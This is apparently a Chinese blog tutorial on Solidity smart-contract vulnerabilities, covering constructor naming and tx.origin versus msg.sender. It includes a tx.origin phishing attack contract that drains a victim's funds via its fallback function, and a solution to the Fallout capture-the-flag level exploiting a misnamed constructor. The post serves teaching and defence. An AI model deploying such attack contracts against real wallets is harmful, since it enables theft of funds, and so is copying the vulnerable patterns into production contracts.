### 一、前言

上回文章中我们提到了简单函数的漏洞利用情况。我们对`Fallback()`这个回调函数进行了安全漏洞的分析，也针对竞赛题目复现了一些漏洞利用过程。

在本篇文章中，我们继续对**简单函数**进行安全机制分析。本文我们将要对构造函数以及`tx.orgin`、`msg.sender`进行安全分析。在真实的合约开发中，上述这几个函数的使用频率是十分高的，而对于合约来讲，由于其面向对象的特性所迫，所以在编写合约的过程中构造函数是必须要进行使用的。对于`tx.orgin以及msg.sender`函数来讲，这些语法会在函数内部进行条件判断的时候使用，而条件判断往往是安全保障的最重要的一道门。倘若这些地方出现了问题而导致条件被绕过，那么系统的安全性就可能受到巨大的挑战。

倘若这些基础点存在了攻击漏洞，那么带来的危害是不可估量的。下面就看这些地方的漏洞点是如何产生的。

### 二、函数解析

#### 1 构造函数

Solidity编写合约和面向对象编程语言非常相似，我们可以通过构造函数（constructor）来初始化合约对象。

`构造函数`就是方法名和合约名字相同的函数，创建合约时会调用构造函数对状态变量进行数据初始化操作。

```
pragma solidity ^0.4.20;

contract CpTest {

    uint value;

    /* 合约初始化时会调用构造函数 */
    function  CpTest  (uint number, uint p) { 
      value = number * p;
    }

    function getPower() view returns (uint) {
       return value;
    }
}
```

在我们部署合约的时候，我们需要传入参数以便初始化合约中的成员变量。

![img](https://upload-images.jianshu.io/upload_images/7862980-9fc303724e71425d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

我们在构造函数中为成员变量赋初值为：2*5 = 10。

![img](https://upload-images.jianshu.io/upload_images/7862980-9987d8fba376b63d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

那同学就会提问，倘若我不小心忘记书写构造函数，对于Solidity来说的话会不会报错呢？

我们进行相关实验：

![img](https://upload-images.jianshu.io/upload_images/7862980-b9d1f57265d392d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

我们能够看到，虽然我们将构造函数注释掉了，但是我们的合约仍然可以正常的部署。而我们能够查看到我们的成员变量value的值为初始值0。

现在我们做一些实验来验证一个合约中是否可以拥有两个构造函数。

![img](https://upload-images.jianshu.io/upload_images/7862980-cf914fb4be36263b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![img](https://upload-images.jianshu.io/upload_images/7862980-6d7fca6aa6d26d3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

所以我们得到，一个合约中只能有允许一个构造函数存在。

#### 2 tx.orgin函数

下面我们来详细的讲述一下`tx.orgin`以及`msg.sender`的用法以及区别之处。

下面我们来看测试合约：

```
pragma solidity ^0.4.20;

contract CpTest {

    uint value;

    function  CpTest  (uint number, uint p) { 
      value = number * p;
    }

    function getPower() view returns (uint) {
       return value;
    }

    function getOrigin() view returns (address) {
        return tx.origin;
    }

     function getSender() view returns (address) {
        return msg.sender;
    }

}
```

在当前地址`0xca35b7d915458ef540ade6068dfe2f44e8fa733c`下我们调用合约，看看sender的内容与orgin的内容分别是什么：

![img](https://upload-images.jianshu.io/upload_images/7862980-1722d0f00a369a9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

之后，我们通过合约远程调用（A-->B 用A合约调用B合约），来测试其sender的内容与orgin的内容的对应。

```
pragma solidity ^0.4.20;

contract CpTest {

    uint value;

    function  CpTest  (uint number, uint p) { 
      value = number * p;
    }

    function getPower() view returns (uint) {
       return value;
    }

    function getOrigin() view returns (address) {
        return tx.origin;
    }

     function getSender() view returns (address) {
        return msg.sender;
    }

}
    contract testCal {

        CpTest test = CpTest(0x5e72914535f202659083db3a02c984188fa26e9f);
        function getOrigin() view returns (address) {
            return test.getOrigin();
        }

        function getSender() view returns (address) {
            return test.getSender();
        }


}
```

此时我们第二个合约的地址为`0x14723a09acff6d2a60dcdf7aa4aff308fddc160c`。

调用后得到：

![img](https://upload-images.jianshu.io/upload_images/7862980-446700ca2eb8ce3f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

即`testCal`合约远程调用了`CpTest`合约，其`tx.orgin`的值为`testCal`合约的钱包地址。而`msg.sender`的地址为`testCal`合约部署的地址。

下面我们进行更复杂的测试。现在我们部署第三个合约，而此合约将调用第二个合约中的两个函数，并查看第三个合约中的相对应的`orgin与sender`的值。

```
pragma solidity ^0.4.20;

contract CpTest {

    uint value;

    function  CpTest  (uint number, uint p) { 
      value = number * p;
    }

    function getPower() view returns (uint) {
       return value;
    }

    function getOrigin() view returns (address) {
        return tx.origin;
    }

     function getSender() view returns (address) {
        return msg.sender;
    }

}
    contract testCal {

        CpTest test = CpTest(0x5e72914535f202659083db3a02c984188fa26e9f);
        function getOrigin() view returns (address) {
            return test.getOrigin();
        }

        function getSender() view returns (address) {
            return test.getSender();
        }


}

 contract testCal3 {

        testCal test = testCal(0x0fdf4894a3b7c5a101686829063be52ad45bcfb7);
        function getOrigin() view returns (address) {
            return test.getOrigin();
        }

        function getSender() view returns (address) {
            return test.getSender();
        }


}
```

`testCal3`合约的地址为：`0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db`。

我们运行函数得到：

![img](https://upload-images.jianshu.io/upload_images/7862980-a6dfa21512985072.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

即第三个函数的`origin`地址为自己的钱包地址。而`sender`的地址为第二个合约（`testCal`）的部署地址。

![img](https://upload-images.jianshu.io/upload_images/7862980-7f1ce367d57747f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

所以我们可以大胆的分析：我们的`tx.origin`为所最起始调用者的地址（A-->B-->C则为A的地址），然而我们`msg.sender`为最终函数的前一个调用合约地址（A-->B-->C中，由于函数在C中，所以sender为B的合约地址）。

这也相对应的存在了许多安全隐患，我们在下面进行分析。

### 三、漏洞分析

#### 1 tx.origin漏洞分析

`tx.origin`是Solidity 中的一个全局变量 ，它遍历整个调用栈并返回最初发送调用（或交易）的帐户的地址。然而在智能合约中使用此变量时，我们通常会看到它被用于身份验证。这也就存在了很严重的漏洞问题，所以我们针对这个问题来进行相关的安全分析。

此类合约容易受到类似网络钓鱼的攻击。

下面我们来看一段钓鱼代码：

我们假设场景：现在有用户A与攻击者C两个身份。在A用户的地址下，我们部署了：

```
contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner; 
    }

    function () public payable {} // collect ether

    function withdrawAll(address _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(this.balance); 
    }
}
```

我们具体来看这个代码，这里存在一个转账函数，而转账是将`A用户中的余额转给_recipient对应的地址`。然而在转账前我们需要进行一个初始判断：`require(tx.origin == owner)`，即我们合约的拥有者必须==`tx.origin`。

下面我们再来看攻击者合约：

```
contract AttackContract { 

    Phishable phishableContract; 
    address attacker; // The attackers address to receive funds.

    constructor (Phishable _phishableContract, address _attackerAddress) { 
        phishableContract = _phishableContract; 
        attacker = _attackerAddress;
    }

    function () { 
        phishableContract.withdrawAll(attacker); 
    }
}
```

在这个攻击合约中，我们看到它在构造函数中new了`Phishable`对象，
然后传入了攻击者地址。之后又定义了`fallback`函数，而在函数中调用了`phishableContract`对象的`withdrawAll ()`函数。

之后我们来分析下攻击是如何产生的。

根据我们前面写过的文章，我们知道`fallback`函数会在转账的时候被默认调用，所以这个地方就存在了很多隐患。

我们假设一个场景，倘若攻击者通过各种方法（包括诈骗、诱导等）使用户A向攻击者进行一些转账操作，那么他就会默认的调用`phishableContract.withdrawAll(attacker);`函数。而对于此函数我们具体来看：

```
function withdrawAll(address _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(this.balance); 
    }
```

在这个函数中，攻击者将_recipient参数赋值为自己的地址，也就为了用户能够将钱转给攻击者做准备。之后我们来看，倘若此时攻击者绕过了require的限制，那么ta就有可能把用户的钱全部转走。那么攻击者是否能绕过呢？答案是肯定的。

简单来说，此时**User --调用-->Attack的回调函数--调用-->User的withdraw函数**，而呈现出来的`tx.origin`是==合约创世人owner的。

我们做一个简单的实验：

合约内容

```
pragma solidity ^0.4.18;

contract UserWallet {

    address public owner;
    address public owner1;
    function setOwner() public returns(address){
    //   owner = msg.sender;
      return msg.sender;
   }

   function setOwner1() public returns(address){
    //   owner1 = tx.origin;
      return tx.origin;
   }
}

contract abc {

    UserWallet test = UserWallet(0x9dd1e8169e76a9226b07ab9f85cc20a5e1ed44dd);

    function a() public returns (address){
        return test.setOwner1();
    }

}

contract def {

    abc test = abc(0xdd1f635dfb144068f91d430c76f4219088af9e64);

    function b() public returns (address){
        return test.a();
    }

}
```

首先在`0xca35b7d915458ef540ade6068dfe2f44e8fa733c`中部署
![img](https://upload-images.jianshu.io/upload_images/7862980-349afe7ee5632d22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

之后，我们在`0x14723a09acff6d2a60dcdf7aa4aff308fddc160c`部署

![img](https://upload-images.jianshu.io/upload_images/7862980-e8acd50361e379ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

最后我们在`0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db`部署：

![img](https://upload-images.jianshu.io/upload_images/7862980-0c369176658eca6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

根据我们的代码，我们测试tx.orgin所代表的内容。

首先是合约`UserWallet`：

![img](https://upload-images.jianshu.io/upload_images/7862980-0b1cfb40867047a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![img](https://upload-images.jianshu.io/upload_images/7862980-c8c81e9477e3262d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

下面是合约`abc`：

![img](https://upload-images.jianshu.io/upload_images/7862980-da7521c903c5208f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

然而我们这里最重要的函数是：合约`def`。

我们要通过合约`def`来远程调用abc：

对应这里为：

在部署合约`def`的地址下调用合约`abc`中的`b()`函数。

![img](https://upload-images.jianshu.io/upload_images/7862980-867949bb88879991.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![img](https://upload-images.jianshu.io/upload_images/7862980-1b5c433be885629f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

得到实际的地址为：

![img](https://upload-images.jianshu.io/upload_images/7862980-0f52a35230a794c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

```
地址详情
1:0xca35b7d915458ef540ade6068dfe2f44e8fa733c
2:0x14723a09acff6d2a60dcdf7aa4aff308fddc160c
3:0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db
```

这样就绕过了用户函数中的`origin`条件，所以可以进行钓鱼：

倘若用户给调用合约转账，则调用了`fallback`函数。之后`User -> Attack -> User`。即意味着钓鱼合约把用户的钱取走了。

#### 2 构造函数安全分析

构造函数（Constructors）是特殊函数，在初始化合约时经常执行关键的权限任务。在 solidity v0.4.22 以前，构造函数被定义为与所在合约同名的函数。因此，如果合约名称在开发过程中发生变化，而构造函数名称没有更改，它将变成正常的可调用函数。

其实这种漏洞的原理并不复杂，但是带来的危害却是巨大的。

下面我们看一道ctf的题目：

```
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Fallout is Ownable {

  mapping (address => uint) allocations;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  function allocate() public payable {
    allocations[msg.sender] += msg.value;
  }

  function sendAllocation(address allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(this.balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

我们看到题目的要求如下：`Claim ownership of the contract below to complete this level.`让我们成为合约的owner。而我们仔细的查看后发现合约中只有构造函数可以让自己成为owner。然而我们无法手动调用构造函数，所以题目就陷入了僵局。不过在我们仔细的查看后发现：

`Fallout`与构造函数`Fal1out`是不同的。即题目中给的函数并不是构造函数，只是看起来相似而已。

所以我们直接调用改函数即可更改合约`owner`。

在真实的环境中同样有这样的情况产生：

ubixi（[合约代码](https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code)）是另一个显现出这种漏洞的传销方案。合约中的构造函数一开始叫做 `DynamicPyramid` ，但合约名称在部署之前已改为 `Rubixi` 。构造函数的名字没有改变，因此任何用户都可以成为 `creator`

```
contract Rubixi {

        //Declare variables for storage critical to contract
        uint private balance = 0;
        uint private collectedFees = 0;
        uint private feePercent = 10;
        uint private pyramidMultiplier = 300;
        uint private payoutOrder = 0;

        address private creator;

        //Sets creator
        function DynamicPyramid() {
                creator = msg.sender;
        }

        modifier onlyowner {
                if (msg.sender == creator) _
        }

        struct Participant {
                address etherAddress;
                uint payout;
        }
········
}
```

![img](https://upload-images.jianshu.io/upload_images/7862980-8a17d8ae02718cc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### 四、参考资料

- https://www.jianshu.com/p/61e2d9e31aab
- https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code
- https://vessenes.com/ethereum-contracts-are-going-to-be-candy-for-hackers/
- https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin